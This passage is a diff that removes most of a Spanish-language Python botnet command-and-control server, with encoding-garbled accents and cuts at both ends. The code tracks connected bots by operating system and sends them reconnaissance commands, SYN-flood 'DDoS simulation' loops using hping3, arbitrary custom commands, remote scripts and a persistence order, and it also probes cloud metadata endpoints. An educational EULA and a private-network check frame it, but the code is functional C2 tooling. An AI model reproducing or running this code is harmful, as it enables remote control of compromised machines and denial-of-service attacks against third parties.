comandos:\")\r\n-        print(\"1. Comandos b谩sicos\")\r\n-        print(\"2. Comandos avanzados\")\r\n-        tipo_comando = input(\"Ingrese su opci贸n: \")\r\n-\r\n-        if tipo_comando == \"1\":\r\n-            print(\"\\nComandos b谩sicos disponibles:\")\r\n-            print(\"1. Obtener informaci贸n del sistema\")\r\n-            print(\"2. Consultar conexiones de red\")\r\n-            print(\"3. Ver procesos en ejecuci贸n\")\r\n-            print(\"4. Listar archivos en el directorio actual\")\r\n-            print(\"5. Obtener la IP p煤blica\")\r\n-            orden = input(\"Seleccione una orden: \")\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                comando_windows = \"systeminfo\"\r\n-                comando_linux = \"uname -a && lsb_release -a\"\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"netstat -ano\"\r\n-                comando_linux = \"netstat -tunapl\"\r\n-            elif orden == \"3\":\r\n-                comando_windows = \"tasklist\"\r\n-                comando_linux = \"ps aux\"\r\n-            elif orden == \"4\":\r\n-                comando_windows = \"dir\"\r\n-                comando_linux = \"ls -lah\"\r\n-            elif orden == \"5\":\r\n-                comando_windows = \"curl ifconfig.me\"\r\n-                comando_linux = \"curl ifconfig.me\"\r\n-            else:\r\n-                print(\"Opci贸n no v谩lida.\")\r\n-                return\r\n-\r\n-            enviar_comando(comando_windows, comando_linux)\r\n-\r\n-        elif tipo_comando == \"2\":\r\n-            print(\"\\nComandos avanzados disponibles:\")\r\n-            print(\"1. Simular ataque DDoS\")\r\n-            print(\"2. Detener simulaci贸n de DDoS\")\r\n-            print(\"3. Ejecutar un comando personalizado\")\r\n-            print(\"4. Ejecutar un script remoto\")\r\n-            print(\"5. Intentar asegurar la persistencia\")\r\n-            orden = input(\"Seleccione una orden: \")\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                objetivo = input(\"Ingrese la direcci贸n IP del objetivo: \")\r\n-                puerto = input(\"Ingrese el puerto del objetivo: \")\r\n-                protocolo = input(\"Ingrese el protocolo (TCP/UDP): \").upper()\r\n-                if protocolo not in [\"TCP\", \"UDP\"]:\r\n-                    print(\"Protocolo no v谩lido.\")\r\n-                    return\r\n-                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n-                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"stop_ddos\"\r\n-                comando_linux = \"stop_ddos\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n-            elif orden == \"3\":\r\n-                comando_windows = input(\"Ingrese el comando personalizado para Windows: \")\r\n-                comando_linux = input(\"Ingrese el comando personalizado para Linux: \")\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"4\":\r\n-                print(\"Seleccione el tipo de script:\")\r\n-                print(\"1. Python\")\r\n-                print(\"2. Bash\")\r\n-                print(\"3. Otro (especificar)\")\r\n-                \r\n-                tipo = input(\"Ingrese la opci贸n: \")\r\n-\r\n-                if tipo == \"1\":\r\n-                    extension = \"py\"\r\n-                    interprete_linux = \"python3 -c\"\r\n-                    interprete_windows = \"python -c\"\r\n-                elif tipo == \"2\":\r\n-                    extension = \"sh\"\r\n-                    interprete_linux = \"bash -c\"\r\n-                    interprete_windows = \"powershell -Command\"\r\n-                elif tipo == \"3\":\r\n-                    extension = input(\"Ingrese la extensi贸n del script (ejemplo: ps1, rb, pl): \")\r\n-                    interprete_linux = input(\"Ingrese el comando para ejecutarlo en Linux: \")\r\n-                    interprete_windows = input(\"Ingrese el comando para ejecutarlo en Windows: \")\r\n-                else:\r\n-                    print(\"Opci贸n inv谩lida.\")\r\n-                    return\r\n-\r\n-                print(\"\\n驴C贸mo desea proporcionar el script?\")\r\n-                print(\"1. Escribirlo aqu铆\")\r\n-                print(\"2. Proporcionar la ruta de un archivo\")\r\n-                \r\n-                metodo = input(\"Ingrese la opci贸n: \")\r\n-\r\n-                if metodo == \"1\":\r\n-                    print(f\"Escriba su script en {extension}. Finalice con 'EOF' en una l铆nea nueva:\")\r\n-                    lineas = []\r\n-                    while True:\r\n-                        try:\r\n-                            linea = input()\r\n-                            if linea.strip().upper() == \"EOF\":  # Detectar EOF\r\n-                                break\r\n-                            lineas.append(linea)\r\n-                        except KeyboardInterrupt:  # Capturar Ctrl+C para salir\r\n-                            print(\"\\nEntrada cancelada.\")\r\n-                            return\r\n-                    script = \"\\n\".join(lineas)  # Unir l铆neas en una sola cadena\r\n-                elif metodo == \"2\":\r\n-                    ruta = input(\"Ingrese la ruta del archivo: \")\r\n-                    try:\r\n-                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n-                            script = archivo.read()\r\n-                    except Exception as e:\r\n-                        print(f\"Error al leer el archivo: {e}\")\r\n-                        return\r\n-                else:\r\n-                    print(\"Opci贸n inv谩lida.\")\r\n-                    return\r\n-\r\n-                # Reemplazar comillas para evitar problemas con la ejecuci贸n remota\r\n-                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n-\r\n-                comando_windows = f'{interprete_windows} \"{script}\"'\r\n-                comando_linux = f\"{interprete_linux} '{script}'\"\r\n-\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"5\":\r\n-                print(\"\\nIntentando asegurar la persistencia en los bots seleccionados...\")\r\n-                comando_windows = \"persistencia\"\r\n-                comando_linux = \"persistencia\"\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            else:\r\n-                print(\"Opci贸n no v谩lida.\")\r\n-                return\r\n-        else:\r\n-            print(\"Opci贸n no v谩lida.\")\r\n-            return\r\n-    except Exception as e:\r\n-        logging.error(f\"Error en el men煤 de comandos: {e}\")\r\n-\r\n-def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n-    \r\n-    \"\"\"\r\n-    Env铆a un comando a un conjunto de bots seleccionados.\r\n-\r\n-    :param comando_windows: El comando a enviar a los bots Windows.\r\n-    :type comando_windows: str\r\n-    :param comando_linux: El comando a enviar a los bots Linux.\r\n-    :type comando_linux: str\r\n-    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n-    :type tipo_comando: str\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Enviando comando a los bots seleccionados\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        print(\"\\nSeleccione a qu茅 bots enviar el comando:\")\r\n-        print(\"1. Todos los bots\")\r\n-        print(\"2. Solo bots Windows\")\r\n-        print(\"3. Solo bots Linux\")\r\n-        print(\"4. Un bot espec铆fico\")\r\n-        print(\"5. Lista de bots espec铆ficos\")\r\n-\r\n-        seleccion = input(\"Ingrese su opci贸n: \")\r\n-        bots_seleccionados = []\r\n-\r\n-        if seleccion == \"1\":\r\n-            bots_seleccionados = bots\r\n-        elif seleccion == \"2\":\r\n-            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"windows\"]\r\n-        elif seleccion == \"3\":\r\n-            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"linux\"]\r\n-        elif seleccion == \"4\":\r\n-            listar_bots()\r\n-            try:\r\n-                bot_id = int(input(\"Ingrese el ID del bot: \"))\r\n-                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)\r\n-                if bot:\r\n-                    bots_seleccionados.append(bot)\r\n-                else:\r\n-                    print(\"ID de bot no v谩lido.\")\r\n-                    return\r\n-            except ValueError:\r\n-                print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n-                return\r\n-        elif seleccion == \"5\":\r\n-            listar_bots()\r\n-            try:\r\n-                bot_ids_seleccionados = [int(id.strip()) for id in input(\"Ingrese los IDs de los bots separados por comas: \").split(\",\") if id.strip().isdigit()]\r\n-                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]\r\n-                if not bots_seleccionados:\r\n-                    print(\"No se encontraron bots con los IDs proporcionados.\")\r\n-                    return\r\n-            except ValueError:\r\n-                print(\"Entrada inv谩lida. Debe ingresar n煤meros separados por comas.\")\r\n-                return\r\n-        else:\r\n-            print(\"Opci贸n no v谩lida.\")\r\n-            return\r\n-\r\n-        respuestas = {}\r\n-\r\n-        for bot in bots_seleccionados:\r\n-            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)\r\n-\r\n-        print(\"\\n--- Respuestas de los bots ---\\n\")\r\n-        for bot, respuesta in respuestas.items():\r\n-            bot_info = f\"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})\"\r\n-            print(f\"[] {bot_info}: {respuesta}\")\r\n-\r\n-        print(\"\\n--- Volviendo al men煤 principal ---\\n\")\r\n-        time.sleep(2)\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando: {e}\")\r\n-\r\n-def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):\r\n-    \r\n-    \"\"\"\r\n-    Env铆a un comando a un bot espec铆fico basado en su sistema operativo.\r\n-\r\n-    Determina el sistema operativo del bot y env铆a el comando adecuado \r\n-    para Windows o Linux. Espera una respuesta del bot por un tiempo \r\n-    m谩ximo definido y devuelve la respuesta si se recibe. Maneja la \r\n-    desconexi贸n del bot si ocurre durante la comunicaci贸n.\r\n-\r\n-    :param bot: El socket del bot al que se enviar谩 el comando.\r\n-    :param comando_windows: El comando a ejecutar si el bot es Windows.\r\n-    :param comando_linux: El comando a ejecutar si el bot es Linux.\r\n-    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n-    :type tipo_comando: str\r\n-    :return: La respuesta del bot o un mensaje de error si no se recibe \r\n-             respuesta o si el bot se desconecta.\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(f\"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}\")\r\n-        so = sistemas_operativos.get(bot, \"desconocido\")\r\n-        comando = comando_windows if so == \"windows\" else comando_linux\r\n-        bot_id = bot_ids.get(bot, \"Desconocido\")\r\n-\r\n-        try:\r\n-            bot.send(comando.encode('utf-8'))\r\n-            print(f\"\\n[] Orden enviada a bot {bot_id} ({so.capitalize()})\\n\")\r\n-\r\n-            # Esperar hasta que `manejar_bot()` almacene la respuesta\r\n-            tiempo_maximo = 5  # Segundos\r\n-            tiempo_inicial = time.time()\r\n-\r\n-            while time.time() - tiempo_inicial < tiempo_maximo:\r\n-                if bot_id in respuestas_bots:\r\n-                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta\r\n-                    if tipo_comando == \"ddos_start\":\r\n-                        ddos_status[bot_id] = \"running\"\r\n-                    elif tipo_comando == \"ddos_stop\":\r\n-                        ddos_status[bot_id] = \"stopped\"\r\n-                    print(f\"\\n--- Respuesta del Bot {bot_id} ---\\n{respuesta}\\n\")\r\n-                    return respuesta if respuesta else \"[INFO] Comando ejecutado sin salida\"\r\n-                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente\r\n-\r\n-            return \"[ERROR] No hubo respuesta del bot (Timeout)\"\r\n-\r\n-        except (socket.error, BrokenPipeError):\r\n-            print(f\"[] Bot {bot_id} desconectado.\")\r\n-            if bot in bots:\r\n-                bots.remove(bot)\r\n-            if bot in bot_ids:\r\n-                del bot_ids[bot]\r\n-            if bot in sistemas_operativos:\r\n-                del sistemas_operativos[bot]\r\n-            return \"[ERROR] El bot se ha desconectado.\"\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}\")\r\n-\r\n-def cerrar_conexion_bots():\r\n-    \r\n-    \"\"\"\r\n-    Cierra la conexi贸n con un bot seleccionado por el usuario.\r\n-    \r\n-    El usuario puede seleccionar a los bots a los que quiere cerrar la conexi贸n\r\n-    mediante un ID o bien escribir \"todos\" para cerrar la conexi贸n con todos\r\n-    los bots conectados.\r\n-    \r\n-    :return: None\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Cerrando conexi贸n con los bots seleccionados\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        listar_bots()\r\n-        \r\n-        try:\r\n-            bot_id = int(input(\"Seleccione el ID del bot cuya conexi贸n quiere cerrar: \")) # Obtener el ID del bot seleccionado\r\n-        except ValueError:\r\n-            print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n-            return\r\n-\r\n-        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None) # Buscar el bot con el ID correspondiente\r\n-        \r\n-        if not bot: # Si no se encuentra el bot\r\n-            print(f\"ID de bot {bot_id} no v谩lido.\") # Imprimir un mensaje de error\r\n-            return\r\n-\r\n-        try:\r\n-            bot.close() # Cerrar la conexi贸n\r\n-            print(f\"Conexi贸n con el bot {bot_id} cerrada.\") # Imprimir un mensaje de confirmaci贸n\r\n-        except Exception as e:\r\n-            print(f\"Error al cerrar la conexi贸n con el bot {bot_id}: {e}\")\r\n-\r\n-        if bot in bots:\r\n-            bots.remove(bot) # Eliminar el bot de la lista\r\n-\r\n-        if bot in bot_ids:\r\n-            del bot_ids[bot] # Eliminar el ID del bot\r\n-\r\n-        if bot in sistemas_operativos:\r\n-            del sistemas_operativos[bot] # Eliminar el SO del bot\r\n-\r\n-        print(f\"Bot {bot_id} eliminado correctamente del sistema.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al cerrar conexi贸n con los bots: {e}\")\r\n-\r\n-def cargar_configuracion():\r\n-    \r\n-    \"\"\"\r\n-    Carga la configuraci贸n del servidor desde un archivo \"config.ini\" ubicado\r\n-    en el directorio \"config\" del proyecto.\r\n-\r\n-    La configuraci贸n se almacena en un objeto con las siguientes claves:\r\n-        * BASE_DIR: Directorio base del proyecto.\r\n-        * HOST: Direcci贸n IP del servidor.\r\n-        * PORT: Puerto de escucha del servidor.\r\n-        * MAX_CONNECTIONS: N煤mero m谩ximo de conexiones permitidas.\r\n-        * DB_PATH: Ruta del archivo de la base de datos.\r\n-        * SECRET_KEY: Clave secreta para la autenticaci贸n.\r\n-        * HASH_ALGORITHM: Algoritmo de hash para la autenticaci贸n.\r\n-        * LOG_LEVEL: Nivel de log (DEBUG, INFO, WARNING, ERROR, CRITICAL).\r\n-        * SERVER_LOG_FILE: Ruta del archivo de log.\r\n-\r\n-    Si no se encuentra el archivo de configuraci贸n o hay un error al leerlo,\r\n-    se muestra un mensaje de error y se sale del programa con un estado de\r\n-    error.\r\n-\r\n-    :return: Un objeto con la configuraci贸n cargada.\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Cargando configuraci贸n del servidor\")\r\n-        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n-        CONFIG_DIR = os.path.join(BASE_DIR, \"..\", \"config\")\r\n-        CONFIG_PATH = os.path.join(CONFIG_DIR, \"config.ini\")\r\n-\r\n-        if not os.path.exists(CONFIG_PATH):\r\n-            raise FileNotFoundError(f\"[ERROR] No se encontr贸 el archivo de configuraci贸n: {CONFIG_PATH}\")\r\n-\r\n-        config = configparser.ConfigParser()\r\n-        config.read(CONFIG_PATH)\r\n-\r\n-        return {\r\n-            \"BASE_DIR\": BASE_DIR,\r\n-            \"HOST\": config.get(\"NETWORK\", \"HOST\"),\r\n-            \"PORT\": config.getint(\"NETWORK\", \"PORT\"),\r\n-            \"MAX_CONNECTIONS\": config.getint(\"NETWORK\", \"MAX_CONNECTIONS\"),\r\n-            \"DB_PATH\": os.path.join(BASE_DIR, config.get(\"DATABASE\", \"DB_PATH\")),\r\n-            \"SECRET_KEY\": config.get(\"SECURITY\", \"SECRET_KEY\"),\r\n-            \"HASH_ALGORITHM\": config.get(\"SECURITY\", \"HASH_ALGORITHM\"),\r\n-            \"LOG_LEVEL\": config.get(\"LOGGING\", \"LOG_LEVEL\"),\r\n-            \"SERVER_LOG_FILE\": os.path.join(BASE_DIR, \"..\", config.get(\"LOGGING\", \"LOG_DIR\"), config.get(\"LOGGING\", \"SERVER_LOG_FILE\"))\r\n-        }\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al cargar la configuraci贸n: {e}\")\r\n-        exit(1)\r\n-\r\n-def iniciar_servidor():\r\n-    \"\"\"\r\n-    Inicializa el servidor de Comando y Control (C2) verificando primero\r\n-    que no se ejecute en una red privada y mostrando un aviso de EULA.\r\n-\r\n-    Luego, inicializa la base de datos, configura el sistema de logging y\r\n-    lanza el servidor de C2.\r\n-\r\n-    :return: None\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Iniciando servidor de Comando y Control (C2)\")\r\n-        config = cargar_configuracion()\r\n-        configurar_logging(config)  # Pasar el objeto de configuraci贸n en lugar de la cadena\r\n-        if not esRedPrivada(config[\"HOST\"]):\r\n-            input(\"[ERROR] No puedes ejecutar este servidor fuera de una red privada. Presione ENTER para cerrar.\")\r\n-            sys.exit(1)\r\n-        verificar_eula(\"servidor\")\r\n-        init_db(config[\"DB_PATH\"])\r\n-        servidor_CnC(config[\"HOST\"], config[\"PORT\"])\r\n-        logging.info(\"Servidor de Comando y Control (C2) iniciado correctamente\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al iniciar el servidor: {e}\")\r\n-\r\n-if __name__ == \"__main__\":\r\n-    try:\r\n-        iniciar_servidor()\r\n-    except Exception as e:\r\n-        logging.error(f\"Error en la ejecuci贸n principal: {e}\")\n-import logging\r\n-import socket\r\n-import sys\r\n-import threading\r\n-import time\r\n-import os\r\n-import ipaddress\r\n-import requests\r\n-import sqlite3\r\n-import configparser\r\n-from datetime import datetime\r\n-\r\n-bots = [] # List de bots\r\n-bot_ids = {} # Diccinario con los IDS de los bots\r\n-sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\n-respuestas_bots = {}  # Diccionario para almacenar las 煤ltimas respuestas de los bots\r\n-ddos_status = {}  # Diccionario para almacenar el estado del DDoS en cada bot\r\n-server_running = True  # Variable para controlar el estado del servidor\r\n-\r\n-def configurar_logging(config):\r\n-    \"\"\"\r\n-    Configura el sistema de logging del servidor.\r\n-\r\n-    El nivel de log se establece seg煤n la clave \"LOG_LEVEL\" en el objeto de configuraci贸n.\r\n-    El nivel de log puede ser \"DEBUG\", \"INFO\", \"WARNING\", \"ERROR\" o \"CRITICAL\".\r\n-    Si no se especifica un nivel de log, se establece en \"INFO\" por defecto.\r\n-\r\n-    La ruta del archivo de log se establece seg煤n la clave \"LOG_FILE\" en el objeto de configuraci贸n.\r\n-    La ruta se crea si no existe.\r\n-\r\n-    El formato de los mensajes de log se establece en \"%(asctime)s - %(levelname)s - %(message)s\".\r\n-\r\n-    Los mensajes de log se escriben en el archivo de log y en la consola.\r\n-\r\n     :param config: Un objeto con la configuraci贸n del servidor.\r\n     \"\"\"\r\n     try:\r\n-        log_level = config[\"LOG_LEVEL\"].upper()\r\n-        log_file = config[\"SERVER_LOG_FILE\"]\r\n-\r\n-        log_levels = {\r\n-            \"DEBUG\": logging.DEBUG,\r\n-            \"INFO\": logging.INFO,\r\n-            \"WARNING\": logging.WARNING,\r\n-            \"ERROR\": logging.ERROR,\r\n-            \"CRITICAL\": logging.CRITICAL\r\n-        }\r\n-        log_level = log_levels.get(log_level, logging.INFO)\r\n-\r\n-        os.makedirs(os.path.dirname(log_file), exist_ok=True)\r\n-\r\n-        logging.basicConfig(\r\n-            level=log_level,\r\n-            format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n-            handlers=[\r\n-                logging.FileHandler(log_file, encoding=\"utf-8\"),\r\n-                logging.StreamHandler(sys.stdout)\r\n-            ]\r\n-        )\r\n-\r\n-        logging.info(\"Sistema de logging configurado correctamente.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al configurar el logging: {e}\")\r\n-\r\n-# Inicializar la base de datos\r\n-def init_db(DB_PATH):\r\n-    \"\"\"\r\n-    Inicializa la base de datos SQLite para almacenar informaci贸n sobre los bots y sus respuestas.\r\n-\r\n-    Crea la carpeta y el archivo de la base de datos si no existe,\r\n-    y crea las tablas \"bots\" y \"respuestas\" si no existen.\r\n-\r\n-    :param DB_PATH: La ruta del archivo de la base de datos.\r\n-    :type DB_PATH: str\r\n-    \"\"\"\r\n-    try:\r\n-        db_dir = os.path.dirname(DB_PATH)\r\n-        if not os.path.exists(db_dir):\r\n-            os.makedirs(db_dir)  # Crear carpeta si no existe\r\n-\r\n-        conn = sqlite3.connect(DB_PATH)\r\n-        cursor = conn.cursor()\r\n-\r\n-        cursor.execute('''CREATE TABLE IF NOT EXISTS bots (\r\n-                            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n-                            identificador TEXT UNIQUE,\r\n-                            ip TEXT,\r\n-                            hostname TEXT,\r\n-                            os TEXT,\r\n-                            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP\r\n-                        )''')\r\n-\r\n-        cursor.execute('''CREATE TABLE IF NOT EXISTS respuestas (\r\n-                            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n-                            bot_id INTEGER,\r\n-                            respuesta TEXT,\r\n-                            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\r\n-                            FOREIGN KEY (bot_id) REFERENCES bots (id)\r\n-                        )''')\r\n-\r\n-        conn.commit()\r\n-        conn.close()\r\n-        logging.info(\"Base de datos inicializada correctamente.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al inicializar la base de datos: {e}\")\r\n-\r\n-def agregar_respuesta_en_db(config, bot_id, respuesta):\r\n-    \"\"\"\r\n-    Agrega una respuesta de un bot a la base de datos SQLite.\r\n-\r\n-    :param config: Un objeto con la configuraci贸n del servidor.\r\n-    :param bot_id: El ID del bot que envi贸 la respuesta.\r\n-    :type bot_id: int\r\n-    :param respuesta: La respuesta del bot.\r\n-    :type respuesta: str\r\n-    \"\"\"\r\n-    try:\r\n-        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n-        cursor = conn.cursor()\r\n-        cursor.execute(\"INSERT INTO respuestas (bot_id, respuesta, timestamp) VALUES (?, ?, ?)\", (bot_id, respuesta, datetime.now()))\r\n-        conn.commit()\r\n-        conn.close()\r\n-        logging.info(f\"Respuesta del bot {bot_id} agregada a la base de datos.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al agregar la respuesta del bot en la base de datos: {e}\")\r\n-\r\n-def detectarEntornoCloud():\r\n-    \r\n-    \"\"\"\r\n-    Detecta si el entorno actual es un entorno de cloud computing.\r\n-\r\n-    Intenta conectarse a los puntos de metadata de AWS y Google Cloud para \r\n-    determinar si el c贸digo se ejecuta en un entorno de nube. Si se logra \r\n-    conectar exitosamente a cualquiera de estos servicios, se asume que el \r\n-    entorno es un entorno de cloud y se devuelve True. En caso contrario, \r\n-    se devuelve False.\r\n-\r\n-    Returns:\r\n-        bool: True si se ejecuta en un entorno de cloud, False en caso contrario.\r\n-    \"\"\"\r\n-    try:\r\n-        try:\r\n-            # AWS Metadata\r\n-            if requests.get(\"http://169.254.169.254/latest/meta-data/\", timeout=1).status_code == 200:\r\n-                logging.info(\"Entorno de cloud computing detectado.\")\r\n-                return True\r\n-        except requests.exceptions.RequestException:\r\n-            pass\r\n-\r\n-        try:\r\n-            # Google Cloud Metadata\r\n-            if requests.get(\"http://metadata.google.internal/\", timeout=1).status_code == 200:\r\n-                logging.info(\"Entorno de cloud computing detectado.\")\r\n-                return True\r\n-        except requests.exceptions.RequestException:\r\n-            pass\r\n-\r\n-        return False\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al detectar el entorno cloud: {e}\")\r\n-        return False\r\n-\r\n-def esRedPrivada(ip):\r\n-    \"\"\"Indica si una IP es de una red privada o no.\r\n-\r\n-    La funci贸n intenta crear un objeto ipaddress.ip_address() con la IP dada y devuelve\r\n-    el resultado de llamar a su m茅todo is_private(). Si la IP no es v谩lida,\r\n-    devuelve False.\r\n-\r\n-    Parameters:\r\n-    ip (str): La IP a verificar.\r\n-\r\n-    Returns:\r\n-    bool: True si la IP es de una red privada, False si no lo es.\r\n-    \"\"\"\r\n-    try:\r\n-        result = ipaddress.ip_address(ip).is_private\r\n-        logging.info(f\"Verificaci贸n de red privada para la IP: {ip}\")\r\n-        return result\r\n-    except ValueError as e:\r\n-        logging.error(f\"Error al verificar si la IP es privada: {e}\")\r\n-        return False\r\n-\r\n-def verificar_eula(tipo):\r\n-    \"\"\"\r\n-    Verifica si el usuario ha aceptado la licencia antes de ejecutar el programa.\r\n-    \r\n-    :param tipo: \"servidor\" o \"cliente\" para determinar qu茅 EULA verificar.\r\n-    \"\"\"\r\n-    try:\r\n-        if tipo not in [\"servidor\", \"cliente\"]:\r\n-            raise ValueError(\"Tipo de EULA no v谩lido. Debe ser 'servidor' o 'cliente'.\")\r\n-\r\n-        # Ruta para el archivo EULA en la carpeta docs\r\n-        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n-        eula_path = os.path.join(BASE_DIR, \"..\", \"docs\", f\"eula_{tipo}.txt\")\r\n-\r\n-        # Si no existe, lo crea\r\n-        if not os.path.exists(eula_path):\r\n-            with open(eula_path, \"w\") as f:\r\n-                f.write(\"ACCEPTED=False\")\r\n-\r\n-        # Leer si ya acept贸\r\n-        with open(eula_path, \"r\") as f:\r\n-            for linea in f:\r\n-                if \"ACCEPTED=True\" in linea:\r\n-                    logging.info(f\"Verificaci贸n de EULA para el tipo: {tipo}\")\r\n-                    return True\r\n-\r\n-        # Mostrar Acuerdo de Licencia\r\n-        print(\"\\n\" + \"=\"*50)\r\n-        print(f\"  ACUERDO DE LICENCIA ({tipo.upper()}) \")\r\n-        print(\"=\"*50)\r\n-        print(\"\\nEste software es exclusivamente para prop贸sitos educativos y de investigaci贸n.\")\r\n-        print(\"El uso en redes ajenas sin autorizaci贸n est谩 prohibido.\")\r\n-        print(\"El usuario debe cumplir con las leyes de su pa铆s.\")\r\n-        print(\"No se permite el uso de este software en redes p煤blicas.\")\r\n-        print(\"El autor no se hace responsable del uso indebido.\\n\")\r\n-        print(\"EL SOFTWARE NO FUNCIONAR FUERA DE UNA RED PRIVADA.\\n\")\r\n-        \r\n-        print(\"  QUEDA TERMINANTEMENTE PROHIBIDO:\")\r\n-        print(\"   - Usarlo con intenciones maliciosas.\")\r\n-        print(\"   - Ejecutarlo en infraestructuras cr铆ticas sin permiso.\")\r\n-        print(\"   - Modificarlo para evadir restricciones.\")\r\n-        print(\"   - Distribuirlo con fines ilegales o comerciales.\\n\")\r\n-        \r\n-        print(\"  Al escribir 'ACEPTO', el usuario declara que asume toda la responsabilidad sobre su uso.\\n\")\r\n-        \r\n-        respuesta = input(\"Escriba 'ACEPTO' para continuar: \").strip().upper()\r\n-        \r\n-        if respuesta == \"ACEPTO\":\r\n-            with open(eula_path, \"w\") as f:\r\n-                f.write(\"ACCEPTED=True\")\r\n-            logging.info(f\"Verificaci贸n de EULA para el tipo: {tipo}\")\r\n-            return True\r\n-        else:\r\n-            print(\"Debe aceptar la licencia para usar este software.\")\r\n-            exit()\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al verificar el EULA: {e}\")\r\n-        exit()\r\n-\r\n-def agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os):\r\n-    \"\"\"\r\n-    Agrega un bot a la base de datos SQLite o actualiza su IP si ya existe.\r\n-\r\n-    :param config: Un objeto con la configuraci贸n del servidor.\r\n-    :param identificador: El identificador 煤nico del bot.\r\n-    :type identificador: str\r\n-    :param ip: La direcci贸n IP del bot.\r\n-    :type ip: str\r\n-    :param hostname: El nombre del host del bot.\r\n-    :type hostname: str\r\n-    :param os: El sistema operativo del bot.\r\n-    :type os: str\r\n-    \"\"\"\r\n-    try:\r\n-        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n-        cursor = conn.cursor()\r\n-        cursor.execute(\"SELECT id FROM bots WHERE identificador = ?\", (identificador,))\r\n-        bot = cursor.fetchone()\r\n-        if bot:\r\n-            cursor.execute(\"UPDATE bots SET ip = ?, hostname = ?, os = ?, last_seen = ? WHERE identificador = ?\", (ip, hostname, os, datetime.now(), identificador))\r\n-            logging.info(f\"Bot actualizado en la base de datos: {identificador}, {ip}, {hostname}, {os}\")\r\n-        else:\r\n-            cursor.execute(\"INSERT INTO bots (identificador, ip, hostname, os, last_seen) VALUES (?, ?, ?, ?, ?)\", (identificador, ip, hostname, os, datetime.now()))\r\n-            logging.info(f\"Bot agregado a la base de datos: {identificador}, {ip}, {hostname}, {os}\")\r\n-        conn.commit()\r\n-        conn.close()\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al agregar o actualizar el bot en la base de datos: {e}\")\r\n-\r\n-def manejar_bot(conn, addr, bot_id, config):\r\n-    \"\"\"\r\n-    Maneja una conexi贸n de bot y la agrega o actualiza en la base de datos.\r\n-\r\n-    :param conn: El socket del bot conectado.\r\n-    :type conn: socket.socket\r\n-    :param addr: La direcci贸n IP y puerto del bot.\r\n-    :type addr: tuple\r\n-    :param bot_id: El ID del bot, que se usar谩 para identificarlo.\r\n-    :type bot_id: int\r\n-    :param config: Un objeto con la configuraci贸n del servidor.\r\n-    \"\"\"\r\n-    try:\r\n-        ip, port = addr\r\n-        hostname = socket.gethostbyaddr(ip)[0]\r\n-        logging.info(f\"Bot {bot_id} conectado desde {addr}\")\r\n-        print(f\"Bot {bot_id} conectado desde 